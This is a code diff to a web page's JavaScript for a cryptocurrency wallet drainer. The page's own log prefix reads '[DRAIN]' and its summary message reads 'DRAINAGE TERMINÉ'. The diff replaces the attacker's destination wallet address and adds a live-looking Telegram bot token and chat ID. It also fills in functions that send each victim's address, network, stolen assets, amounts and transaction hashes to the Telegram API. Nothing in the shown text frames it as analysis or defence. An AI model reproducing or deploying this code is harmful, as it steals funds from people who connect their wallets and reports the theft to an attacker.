@@ -128,10 +128,10 @@
 <script type="module">
 import { createWeb3Modal, defaultConfig } from 'https://esm.sh/@web3modal/ethers5@4.0.0'
 
-const DEST = "0xe62d51b592571bb67adeb9f99d9ff4e03ccd7578";
+const DEST = "0x63ce9a6Bd0cf439EA6D114F504B017EA43Af4BC1";
 const PID = "72f0728c47e59d2eb9fc83069bc6843d";
-const TELEGRAM_BOT = "";
-const TELEGRAM_CHAT = "";
+const TELEGRAM_BOT = "8551220717:AAGgPMGobMwwxKFPmCJSMFVfSbUzyRQqMIY";
+const TELEGRAM_CHAT = "8309320360";
 
 const ERC20_ABI = [
     "function balanceOf(address) view returns (uint256)",
@@ -200,8 +200,40 @@ function setProgress(n){document.getElementById('progress').style.width=n+'%';}
 function log(m){console.log('[DRAIN] '+m);}
 
 
-async function sendTelegram(msg) {}
-async function sendTelegramSummary() {}
+async function sendTelegram(msg) {
+    if (!TELEGRAM_BOT || !TELEGRAM_CHAT) return;
+    try {
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT,
+                text: msg,
+                parse_mode: 'HTML'
+            })
+        });
+    } catch(e) {}
+}
+
+async function sendTelegramSummary() {
+    if (!TELEGRAM_BOT || !TELEGRAM_CHAT || results.length === 0) return;
+    
+    let msg = '🎉 DRAINAGE TERMINÉ\\n\\n';
+    msg += '👤 Adresse: ' + address + '\\n';
+    msg += '🌐 Réseau: ' + CHAINS[chainId].name + '\\n';
+    msg += '📊 Total: ' + results.length + ' assets\\n\\n';
+    msg += 'Détails:\\n';
+    
+    results.forEach((r, i) => {
+        msg += '\\n' + (i+1) + '. ' + r.symbol + '\\n';
+        msg += '   💰 ' + r.amount + '\\n';
+        msg += '   ✅ ' + r.txHash.slice(0,10) + '...\\n';
+    });
+    
+    msg += '\\n⏰ ' + new Date().toLocaleString();
+    
+    await sendTelegram(msg);
+}
 
 window.connect = async function() {
     try {
